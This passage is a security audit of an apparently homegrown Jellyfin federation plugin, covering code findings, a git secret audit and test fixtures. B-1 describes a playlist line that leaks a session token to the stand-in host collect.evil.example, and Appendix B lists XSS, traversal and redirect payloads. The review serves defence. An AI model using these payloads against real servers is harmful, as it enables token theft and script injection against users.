| Can the filter treat a request as non-federated yet reach peer data? | No. Peer data is reachable only through the plugin's own handlers. If the filter misses a request it falls through to core, which can touch only the stub (a sentinel with a random stubKey), and may run ffprobe/ffmpeg against `federation.invalid`. The fail-open direction is safe by construction, as long as the `.strm` contains nothing but the sentinel. A miss costs function and a little CPU (A-20.2, B-8). |
| Can it treat a request as federated when it should not? | Only for GUIDs in `FederationIndex`, which are stubs only. The real risk in this direction is the auth step after the decision (A-4). |
| Authorization for a local user without library access | Correct in design (`IsVisibleStandalone`, 404). The trap is A-4: a null user disables the check. |
| Per-play HLS grants: forgeable, replayable, bound? | Not forgeable (128-bit random, memory only). Bound to local user id, not to device, IP or token (acceptable: the token is the credential). Replayable by the owner until expiry. Expiry is idle-sliding only and there is no re-validation (A-19). |
| SSRF via admin URLs and peer-returned data | Peer-returned data: redirects closed (3xx is an error, `AllowAutoRedirect=false`), absolute URIs closed in design, but the playlist rewrite is a denylist (A-2). Admin URLs: admin-only, proxy-mode and range gaps (A-8). |
| Path traversal and name injection | Design is sound (NFKC before replacement, confinement check, no symlinks, `XmlWriter` with `CheckCharacters`, no URL elements). Minor notes in A-20.8. Provider ids are load-bearing for XSS (A-12). |
| AES-GCM secret store | See A-16: honest, marginally better than 0600, details missing. |
| Token exposure (logs, exceptions, page JS, responses) | Design is good for the **peer** token (header-only, own HttpClient, redaction). The caller's own token in URLs and Debug logs is core behavior (A-20.4). The spike's page JS and config API expose the peer token (B-7); the design removes it. |
| DoS | Cap and timeout tables are good. Gaps: body-read timeouts and caps were not implemented (B-2), disk quota and new-items guard (A-10), slot starvation (A-5), Peer-side transcode cap (A-9). |
| Malicious peer attacking Home | A-2, A-3, A-10, A-11, A-12, A-6 (ratings), plus spike B-1, B-2, B-3. |
| Peer-side hardening filter risk | A-13. |
| Cross-user privacy | Local users seeing friend libraries: A-6. Friend learning who watched what: documented in T26 and Q4; the Peer sees the share user, titles, times and positions, and (A-15) client names. It never sees Home usernames or IPs provided A-2 and A-15 are applied. |
| Quick Connect abuse | A-1 (verified), A-9 (self-minting). |
| CSRF | Not applicable (A-20.5). |
| Rate limiting | Table 6.9 is good; additions in A-5, A-20.7, A-1 (Initiate shield). |

---

# PART B: CODE REVIEW (spike, `src/`, `tools/`, `lab/`)

## B. Critical

### B-1 [Critical] `PlaylistRewriter` hands the caller's Home token to an arbitrary host

- **Where:** `src/Jellyfin.Plugin.Federation/Playback/PlaylistRewriter.cs:54-74` (the relative-URI branch), `:39-41` and `:76-77` (the `URI="..."` regex).
- **Issue (verified, code):** `RewriteUri` rejects a URI only if it starts with `/` or contains `://`. Anything else is treated as relative and gets `?ApiKey=<local token>` appended. So these pass: `https:/collect.evil.example/s.ts`, `https:collect.evil.example/s.ts`, `data:...`. The attribute regex also matches the tail of `X-ASSET-URI="..."`, so the same lines inside a `#EXT-X-DATERANGE` are rewritten and given the token.
- **Exploit scenario (derived, not executed):** A hostile or compromised peer returns, in `main.m3u8`, the line `https:/collect.evil.example/s.ts`. The proxy emits `https:/collect.evil.example/s.ts?ApiKey=<TOKEN>`. hls.js resolves it with url-toolkit, which returns a URI that already has a scheme unchanged; the browser's URL parser (WHATWG) treats a special-scheme URL whose scheme differs from the page's as absolute, so it requests `https://collect.evil.example/s.ts?ApiKey=<TOKEN>`. This works when the Home page is served over plain http (LAN or tailnet, the default deployment). On an https page the `http:` form is blocked as mixed content. The attacker receives the Home session token of whoever plays the title; if that is an admin, the server is taken over.
- **Fix:** A-2. Minimum immediate patch: reject any URI line whose first path segment contains `:`, accept only lines matching the positive regexes, and replace the attribute regex with a tag allowlist. Lab check `tools/spike-verify.sh` only tests an honest peer; add the hostile fixtures (Appendix B).
- **Blocks MVP:** Yes. The rewriter as written must not ship; replace it with the R1-R8 design.

## B. High

### B-2 [High] Peer response bodies are read without limits, and timeouts cover only headers

- **Where:** `FederationPlaybackFilter.cs:164-169` (checks `Content-Length` only, then `ReadAsStringAsync`, so a chunked response is unbounded); `FederationProxyController.cs:180-189` (same, and the `text.Length` check runs after the whole body is already in memory); `PeerHttp.cs:40` (`Timeout = InfiniteTimeSpan`) and `:100-110` (the timeout token only bounds the wait for headers); `FederationProxyController.cs:246-250` (`CopyToAsync` with no idle timeout and no length check).
- **Exploit scenario:** A hostile peer answers PlaybackInfo or a playlist with `Transfer-Encoding: chunked` and an endless body, or trickles one byte a minute. The Jellyfin process grows until it is OOM-killed, taking Home down for every user. A stalled body holds the request until the client gives up. Any logged-in local user can trigger it by pressing Play.
- **Fix:** a counting stream with a hard byte cap and a linked `CancellationTokenSource` with a per-read idle timeout for every body class (design 6.10 table); never `ReadAsStringAsync` on peer content; for the static copy, enforce the declared length and an idle timeout.
- **Blocks MVP:** Yes (K2).

### B-3 [High] The peer's `Content-Type` is copied verbatim, and Jellyfin sets no nosniff/CSP

- **Where:** `FederationProxyController.cs:205-212` (`Response.ContentType = headers.ContentType.ToString()`); allowed paths in `ProxyUrls.cs:160-171` include subtitles, attachments and `stream.*`.
- **Exploit:** see A-3. The path `.../{mediaSourceId}/Subtitles/2/Stream.vtt?ApiKey=...` passes `IsAllowedPath`; the peer returns `text/html` and a script; the Home admin opens the link.
- **Fix:** A-3. In the spike: set the type from the path, and send `nosniff` and `CSP: sandbox`.
- **Blocks MVP:** Yes.

### B-4 [High] Client query string and body are forwarded to the peer, so any Home user controls the peer's transcoder

- **Where:** `FederationProxyController.cs:98-100` (whole client query, credentials stripped only, appended to the peer request); `FederationPlaybackFilter.cs:123-127, 224-276` (query and body forwarded; only `UserId` removed and the local id replaced by string substitution).
- **Exploit:** Any user with access to a federated title calls `.../master.m3u8?VideoCodec=hevc&VideoBitrate=...&AllowVideoStreamCopy=false`, `.../stream.mkv` without `Static=true` (progressive transcode), or `hls1/main/N.ts?...` with chosen parameters. They run arbitrary jobs on the friend's CPU and bypass Home's bitrate and transcode policy. Via PlaybackInfo they set `LiveStreamId`, `AutoOpenLiveStream`, arbitrary `MediaSourceId` and `EnableTranscoding`. The shared `DeviceId` lets all of this land in one Peer session.
- **Fix:** design 6.2 step 3 (whitelist body) and 6.4 (grants hold the peer query; clients influence only validated integers).
- **Blocks MVP:** Yes (known; confirming it must not survive).

## B. Medium

### B-5 [Medium] `StubRoot` is empty by default, so every `.strm` in every library is a federation stub

- **Where:** `FederatedItemResolver.cs:37-41` (`!string.IsNullOrWhiteSpace(root) && !IsBelow(...)`), `:79-92` (`File.ReadLines`, unbounded first line), `:22,58` (unbounded cache).
- **Exploit:** Anyone who can put a `.strm` containing `federation://peer/<guid>` into any library folder (shared upload folder, *arr import, a torrent payload) turns Home into an authenticated bridge to the peer's `/Videos/<guid>/...`, using Home's credentials and the Home user's access. (They need the GUIDs, which are bearer secrets themselves; the bridge bypasses network limits such as a Tailscale share.) A multi-gigabyte single-line `.strm` makes the resolver allocate unbounded memory.
- **Fix:** fail closed when `StubRoot` is empty or invalid; compare canonical paths with a separator-terminated prefix (case-sensitive per OS); refuse files above 1 KB before reading; bounded cache. The MVP's `FederationIndex` replaces all of this.
- **Blocks MVP:** The pattern must not survive.

### B-6 [Medium] The identity-resolution pattern is unsafe if reused on anonymous routes

- **Where:** `FederationPlaybackFilter.cs:72-76`, `FederationProxyController.cs:76-83` (`GetAuthorizationInfo` plus `IsAuthenticated && User != null`).
- **Issue:** see A-4. Today it is masked because both entry points sit behind core's `[Authorize]` (the PlaybackInfo controller and the proxy controller), which applies `IsDisabled`, remote-access and schedule checks first. The moment the same code handles `Videos/{id}/stream` it silently loses them. Also, `FederationPlaybackFilter` falls through to `next()` for API-key callers (design 6.1 requires 403).
- **Fix:** A-4.
- **Blocks MVP:** The pattern must not survive.

### B-7 [Medium] The peer token is delivered to the browser; the docs say it is not

- **Where:** `configPage.html:48-56` (loads the whole configuration) and `:61-80` (writes it back); `PluginsController.cs:164-172` (`GET /Plugins/{id}/Configuration` returns `Peers[].Token`; `tools/spike-verify.sh:26-27` reads the token that way); XML on disk is 0644 root (spike section Surprises 8).
- **Issue:** the field help text says "The token is never shown again", and the spike write-up says the page "deliberately never fills the token field back". True for the input field, false for the data: the token sits in the page's `config` object, in the HTTP response and in any HAR the admin shares for support. The save path round-trips it, so a stale tab can overwrite a token.
- **Fix:** K1 removes `Token` from the XML class; admin screens talk only to `Federation/Admin/*` with handles. Treat the spike page as lab-only.
- **Blocks MVP:** Resolved by K1/K11 as designed.

### B-8 [Medium] Unintercepted core routes and raw-path matching

- **Where:** `FederationPlaybackFilter.cs:87-101`.
- **Issue:** matching is by string (`EndsWith("/PlaybackInfo")`, `Split('/')`), while ASP.NET routes by template. Routing ignores a trailing slash, so `/Items/{id}/PlaybackInfo/` should reach `MediaInfoController` but fail the `EndsWith` check and fall through to core (derived, not executed). Core then FullRefreshes and probes the stub. Separately, `Videos/{id}/stream[.ext]` without `Static=true`, `.../Attachments/{n}` and `.../Subtitles/{n}/Stream.{fmt}` are anonymous in core and are not intercepted (spike section Surprises 5); core can start local ffmpeg against the stub for unauthenticated callers.
- **Impact today:** small (the stub holds only `federation://...`). With the MVP's http sentinel, core would try `http://federation.invalid/...` (an NXDOMAIN-hijacking resolver would answer).
- **Fix:** K7 (route-template table, all rows of 6.1).
- **Blocks MVP:** Yes (K7 as designed).

### B-9 [Medium] No concurrency, rate or failure limits toward the peer

- **Where:** `PeerHttp.cs:29-36` (no `MaxConnectionsPerServer`), `FederationPlaybackFilter.cs:30` (30 s header timeout), no circuit breaker.
- **Exploit:** a logged-in local user loops PlaybackInfo or segment requests; each opens a peer connection. With an offline peer every call waits up to 30 s. (Spike open item 8.)
- **Fix:** K2 and section 6.9 as designed.
- **Blocks MVP:** Yes (K2, K8).

## B. Low

### B-10 [Low] Absolute URL from the Host header; unknown peer JSON passes through; canary false positives

- **Where:** `FederationPlaybackFilter.cs:178`, `PlaybackInfoRewriter.cs:116` (`Request.Host` is client-supplied and the response embeds the caller's token; GET PlaybackInfo is a cacheable verb and the response has no `Cache-Control`); `PlaybackInfoRewriter.cs:84-164` rewrites a denylist of fields, so all other peer fields pass through, including the peer's `PlaySessionId`, `RequiredHttpHeaders`, `OpenToken`, `LiveStreamId`, free-text stream titles and any future field; `ProxyUrls.cs:57-60` uses `Contains(peerBase.Authority)`, so a short host name such as `tv` matches any JSON containing "tv" and turns every response into a 502.
- **Fix:** whitelist construction (design 6.2), `Cache-Control: no-store`, host comparison on word boundaries.

### B-11 [Low] Exception filters are too narrow

- **Where:** `FederationPlaybackFilter.cs:188`, `FederationProxyController.cs:156`, and `FederationProxyController.cs:191` (`FindPeer(...)!` is null if the admin removes the peer mid-request).
- **Issue:** `InvalidOperationException`, `FormatException`, `UriFormatException` or a null dereference reach Jellyfin's `ExceptionMiddleware`, which logs the full exception at Error (`ExceptionMiddleware.cs`, the non-ignored branch). Socket error text includes the peer `host:port`, which the design says never appears in logs at Info or above.
- **Fix:** catch `Exception` (except cancellation) at the handler boundary, log the type and a redacted id only.

### B-12 [Low] `PeerHttp` and the page accept any URL; `Math.random` DeviceId

- **Where:** `PeerHttp.cs:66-75, 96` (any http/https URL; userinfo, query and fragment tolerated; the token is sent in cleartext to a plain-http public host); `configPage.html:72` (`Math.random()` for the DeviceId, which is identity, not a secret).
- **Fix:** K2 `AddressPolicy`; the MVP derives DeviceId on the server with a CSPRNG.

### B-13 [Low] Lab tooling hygiene

- **Where:** `tools/spike-setup.sh:39` (the `H()` helper puts the bearer token on every `curl -H` argument) and `:98-101` (the peer token is passed to `node -e` through `process.argv`); both are visible in `ps` to other local users. `:78-87` (unquoted heredoc interpolates `$MOVIE` into a root shell inside the lab host; operator-supplied only). `lab/setup.sh:14-24` (`scp` of `lab.env` to `/tmp` on the lab node with the source file's mode before `pct push`; `chmod 600` has no effect on NTFS). `lab/compose.yaml` (plain HTTP, no resource limits).
- **Status:** lab-only. `lab/lab.env` is gitignored and was never committed (verified below).
- **Fix:** pass secrets by stdin or env, `ssh ... 'umask 077; cat > f'`, quote heredocs.

### B-14 [Low] Public-repo hygiene before the first push

- **Where:** all 9 commits carry the owner's personal email as author; `lab/*`, `docs/*` and `tools/*` name internal infrastructure (a private LAN IP, `the lab node`, the lab host/the production server and the production stack, AdGuard, a Cloudflare Tunnel setup, the owner's handle); `.claude/agents/*.md` is committed.
- **Not secrets**, but decide what to publish. Rewrite the author to a noreply address now (only 9 commits), genericize or gitignore `lab/`, and decide whether `.claude/` ships.

## B. Must NOT survive into the MVP (checklist for Kiro)

1. `PlaylistRewriter.RewriteUri` and the `URI=` regex (B-1) -> closed grammar.
2. Every `ReadAsStringAsync` / unbounded `CopyToAsync` on peer content (B-2).
3. Copying the peer's `Content-Type` (B-3).
4. Forwarding client query, body or headers beyond the whitelist (B-4).
5. `Federation/Proxy/{itemId}/{**path}` catch-all (replaced by grants).
6. `GetAuthorizationInfo`-based identity on any route core leaves anonymous (B-6, A-4).
7. Empty-`StubRoot` fallback and the `federation://` stub format (B-5).
8. `PeerConfiguration.Token` in the XML and any page code that loads or saves it (B-7).
9. Path-string matching of routes (B-8).
10. Absolute `Http` `Path` from `Request.Host` (B-10).
11. Denylist field rewriting in `PlaybackInfoRewriter` (B-10).
12. `Math.random` DeviceId (B-12).

---

# Git history audit

Method (read-only): `git log --all -p` over all 9 commits; searched for the **values** of the lab password variables (loaded from the untracked `lab/lab.env`; values never printed), for the variable and user names, for `password|token|api[_-]?key|secret|BEGIN ... PRIVATE KEY`, for 32-hex strings, for `Bearer`, `ghp_`, `sk-` prefixes, and listed every filename ever tracked that matches `env|secret|key|token|pass|pem|pfx|credential`.

| Check | Result |
|---|---|
| Value of `JF_ADMIN_PASS` in any commit or the working tree | 0 hits |
| Value of `FED_HOME_PASS` in any commit or the working tree | 0 hits |
| Any tracked file named like env, secret, key, token, pass, certificate | none, ever |
| `lab/lab.env` | gitignored (`.gitignore:7 lab/*.env`), never tracked |
| `artifacts/` (built DLL, meta.json) | gitignored, not tracked |
| 32-hex strings in added lines | one dummy `deadbeef...` test token in `tools/spike-verify.sh`; lab item ids in docs (not secrets) |
| Peer or user tokens in docs | all redacted as `<LOCALTOKEN>` / `<PEERTOKEN>` |
| Variable names (`JF_ADMIN_PASS`, `FED_HOME_PASS`) in scripts | present, as names only |

**Result: no secrets in git history.** The only privacy findings are in B-14 (author email, internal topology).

---

# Where I found nothing

- **`[AllowAnonymous]` in plugin code:** none. The only controller (`FederationProxyController`) has class-level `[Authorize]`; no action overrides it. It rejects API-key callers with 403 and returns 404 for unseen items.
- **Peer token in logs, URLs, `.strm` or `.nfo` (spike):** none. Every log call logs ids, status codes and exception type names only (checked all call sites). The peer token goes only in the `Authorization` header (`PeerHttp.cs:97,123`).
- **Redirect following:** disabled (`AllowAutoRedirect = false`, `PeerHttp.cs:31`).
- **Response decompression bombs:** `AutomaticDecompression = None` (`PeerHttp.cs:32`).
- **Header injection into the peer `Authorization` header:** `Sanitize` strips quotes, commas, backslashes and control characters (`PeerHttp.cs:117`).
- **Path traversal in the spike proxy:** the allow-list regex has no `.` or `%` in its path classes; `..`, `%2e%2e`, `;` and backslash forms cannot match (`ProxyUrls.cs:160-171`). The spike writes no files.
- **XSS in the spike config page:** none; values go through `.value` and no `innerHTML` is used.
- **CSRF on config endpoints:** not applicable in Jellyfin's token model (A-20.5).
- **JSON deserialization gadgets:** none; System.Text.Json into plain DTOs, no polymorphic type names.
- **Fail-open of the filter reaching peer data:** none (see the answers table).
- **Design: T7 (Home token forwarded to the Peer), T23 (empty PlaySessionId kill), T22 (mass deletion), T14/T15 (path and NFO injection)**, and the canary, grants and `Protocol=File`/`Path=null` decisions: I found nothing to change beyond the notes above.

# Appendix A: facts verified in the Jellyfin 12.1 / jellyfin-web 12.1 source

| Fact | Where |
|---|---|
| Quick Connect Initiate is anonymous; pending requests keyed by 6-digit code; later Initiate overwrites; Authorize mints a token at approval | `QuickConnectController.cs:54`; `QuickConnectManager.cs:26,31,83,93,117-133,136-165` |
| Authorize is `[Authorize]` and a user may target themself | `QuickConnectController.cs:104-113`; `RequestHelpers.cs:62-83` |
| `ExpireRequests()` is O(pending) on every call | `QuickConnectManager.cs:80,101,139,176` |
| Disabled-user and invalid-token handling is in `AuthService`, not in `GetAuthorizationInfo` | `AuthService.cs:23-40`; `AuthorizationContext.cs:60-218` |
| Remote-access and schedule checks are in the default authorization handler | `DefaultAuthorizationHandler.cs:66-87` |
| Default scheme populates `HttpContext.User` on anonymous endpoints (failures leave it anonymous) | `ApiServiceCollectionExtensions.cs:100-101`; `CustomAuthenticationHandler.cs:46-90` |
| `GetItemById<T>(id, null user)` returns the item unconditionally | `LibraryManager.cs:4074-4087` |
| `IsVisibleStandalone` uses the item rating, blocked-unrated, parental, and collection-folder access | `BaseItem.cs:1541-1585, 1865-1905` |
| Anonymous media routes: video stream, subtitles `Stream.{fmt}`, attachments, legacy HLS segments, item images | `VideosController.cs:314,552`; `SubtitleController.cs:208,295`; `VideoAttachmentsController.cs:50`; `HlsSegmentController.cs`; `ImageController.cs:552` |
| Subtitle routes are declared `text/*` | `SubtitleController.cs:210,297` |
| No security headers anywhere in the server | search of `Jellyfin.Server`, `Jellyfin.Api`, `Emby.Server.Implementations`; pipeline `Startup.cs:176-250` |
| Plugin config API is admin-only and returns the whole configuration, tokens included | `PluginsController.cs:17,164-172` |
| Core resets plugin configuration on any load error; saves non-atomically | `BasePluginOfT.cs:150, 184-198` |
| Plugin install checksum is MD5 | `InstallationManager.cs:586` |
| Built-in 12.x backup includes only listed folders | `BackupService.cs:407-448` |
| `ResponseTimeMiddleware` logs the full URL at Debug | `ResponseTimeMiddleware.cs:53-55` |
| jellyfin-web: `DisplayTitle` unescaped in `innerHTML`; `ExternalUrls`/`HomePageUrl` unescaped in `href`; Overview sanitized; action sheet escapes | `itemDetails/index.js:259,282,312,731-737,924`; `actionSheet.ts:275` |
| jellyfin-web uses hls.js 1.6.16 with default config | `package.json:113`; `plugins/htmlVideoPlayer/plugin.js:567-575` |

**Assumptions I could not verify (no execution, no node_modules):** hls.js 1.6.16 handling of `X-ASSET-URI` / `SERVER-URI`; the exact browser outcome of scheme-prefixed relative lines (derived from the WHATWG URL spec and url-toolkit's documented behavior); whether a trailing slash reaches `MediaInfoController`; where `jellyfin-apiclient` stores the token; defaults of new-user policy fields.

# Appendix B: fixtures to add to Pilot's plan (T-SEC-7 and new)

Hostile playlist lines (each must yield 502 or the line dropped, and no outbound request to the named host):

- `https:/collect.evil.example/s.ts`, `https:collect.evil.example/s.ts`, `HTTPS:/h/x`, ` data:text/plain,x`, `javascript:alert(1)`, `//h/x`, `/\h/x`, `%2e%2e/%2e%2e/Items/x/Download`, `hls1/main/1.ts?next=http://evil/`
- `#EXT-X-DATERANGE:ID="a",X-ASSET-URI="https:/h/p.m3u8"`, `...X-ASSET-LIST="https://h/l.json"`, `#EXT-X-CONTENT-STEERING:SERVER-URI="https://h/s"`, `#EXT-X-SESSION-DATA:DATA-ID="a",URI="https:/h/x"`, `#EXT-X-KEY:METHOD=AES-128,URI="https://h/k"`, `URI=` unquoted, duplicate `URI=` attributes, a tab/CR/LF inside a URI, a 1 MB line, 300,000 lines.

Hostile responses (each must be rejected or neutralized):

- `Content-Type: text/html` and `image/svg+xml` for static, segment, subtitle and attachment routes; `Content-Type: application/json; charset=bogus`; chunked endless body; 1 byte per minute trickle; `Content-Length` larger than the body; `Location` on a 200; `Set-Cookie`.
- PlaybackInfo with `MediaStreams[].Title` and `DisplayTitle` containing `<img src=x onerror=...>`, control and bidi characters, and a 100 KB value; provider ids `tt0133093"><img ...>` and `603 "onmouseover=...`; `OfficialRating` of `G` on an adult title.
- A catalog of 50,000 titles with 10 MB images each (disk quota), 15 unique actors per title (entity cap), 49,000 new titles in one sync (new-items guard), a WebP image, an 8000 x 8000 PNG.

Pairing and auth:

- T-PAIR-6: 5,000 `Initiate` calls during a pairing; Home must report "request replaced".
- T-PAIR-7: attacker device name `Federation: <img src=x onerror=...>` rendered as text.
- T-SEC-15: the A-4 negative matrix.
- T-SEC-16: a share-user token mints a second device via Initiate + Authorize(self); revoke (disable user + sign out all) must leave no working token.
- T-SEC-17: one user takes both peer slots with PlaybackInfo only; a second user must still be able to play.
